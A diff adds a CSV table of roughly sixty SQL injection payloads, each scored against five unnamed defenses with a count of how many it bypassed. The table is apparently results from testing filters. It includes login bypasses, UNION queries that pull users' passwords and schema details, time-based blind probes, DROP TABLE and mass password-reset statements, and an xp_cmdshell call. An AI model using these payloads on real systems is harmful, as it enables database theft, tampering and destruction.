@@ -1,0 +1,63 @@
+Payload,1,2,3,4,5,Total Bypassed
+admin'/*,1,1,1,1,0,4
+ORDER BY 3--,1,1,1,1,0,4
+' OR 'a'='a' --,1,0,1,1,0,3
+' OR 'x'='x,1,0,1,1,0,3
+' HAVING 1=1 --,1,0,1,1,0,3
+' OR 'a'='a,1,0,1,1,0,3
+' OR TRUE --,1,0,1,1,0,3
+' OR EXISTS(SELECT * FROM information_schema.tables) --,1,0,1,1,0,3
+1 OR 1=1,1,1,0,1,0,3
+1; DROP TABLE users,1,0,1,1,0,3
+1 AND 1=0,1,1,0,1,0,3
+'; DROP TABLE users; --,1,0,1,1,0,3
+' OR 0=0 --,1,0,1,1,0,3
+' OR NOT FALSE--,1,0,1,1,0,3
+1; SELECT * FROM users,1,0,1,1,0,3
+"' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --",1,0,1,1,0,3
+WHERE 1=1--,1,0,1,1,0,3
+GROUP BY 2--,1,0,1,1,0,3
+admin' --,1,0,1,1,0,3
+1=1,1,1,0,1,0,3
+' OR '1'='1' AND '1'='1,1,0,0,1,0,2
+' OR 1 IN (SELECT 1) --,1,0,0,1,0,2
+"' OR IF(1=1, SLEEP(5), 0) --",1,0,0,1,0,2
+' OR EXISTS(SELECT * FROM users) --,1,0,1,0,0,2
+' OR '1'='1' /*,1,0,0,1,0,2
+' GROUP BY 1 --,1,0,0,1,0,2
+' OR 'text'='text',1,0,1,0,0,2
+' OR '1'='1,1,0,0,1,0,2
+' AND pg_sleep(5) --,1,0,0,1,0,2
+' AND USER IS NULL,1,0,1,0,0,2
+"' UNION SELECT 1,2,3 --",1,0,0,1,0,2
+1' OR '1' = '1,1,0,0,1,0,2
+1 AND SLEEP(5),1,0,0,1,0,2
+'; UPDATE users SET password='password'; --,1,0,1,0,0,2
+' WHERE 1=0--,1,0,1,0,0,2
+' OR 1=1--,1,0,0,1,0,2
+' OR CURRENT_USER()=CURRENT_USER(),1,0,1,0,0,2
+' OR SLEEP(5) --,1,0,0,1,0,2
+' OR 1=1 LIMIT 1--,1,0,0,1,0,2
+' OR 1=1 --,1,0,0,1,0,2
+' OR 1=1,1,1,0,0,0,2
+' OR 1=1/*,1,0,0,1,0,2
+"' UNION SELECT name, password, email FROM users --",1,0,1,0,0,2
+"' UNION ALL SELECT NULL, NULL --",1,0,0,1,0,2
+"' UNION SELECT column_name,NULL,NULL FROM information_schema.columns --",1,0,0,1,0,2
+"' UNION ALL SELECT 1,2,3,4 --",1,0,0,1,0,2
+admin' OR '1'='1,1,0,0,1,0,2
+1' OR '1'='1'--,1,0,0,1,0,2
+"1' AND SUBSTRING(version(),1,1)='5' --",1,0,0,1,0,2
+' exec xp_cmdshell,1,0,1,0,0,2
+' WHERE 1=1--,1,0,1,0,0,2
+"' UNION SELECT null, null, null, null --",1,0,0,1,0,2
+' AND 1=0,1,0,0,0,0,1
+' OR '1'='1' #,1,0,0,0,0,1
+' OR 2>1,1,0,0,0,0,1
+' OR 1=1#,1,0,0,0,0,1
+' OR 1=1 AND 1=0,1,0,0,0,0,1
+' OR WAITFOR DELAY '0:0:5' --,1,0,0,0,0,1
+"' UNION SELECT 1, version(), user(), 4 --",1,0,0,0,0,1
+1'1,1,0,0,0,0,1
+"1' AND ASCII(SUBSTRING(username,1,1))=97 --",1,0,0,0,0,1
+1' OR '1'='1'#,1,0,0,0,0,1
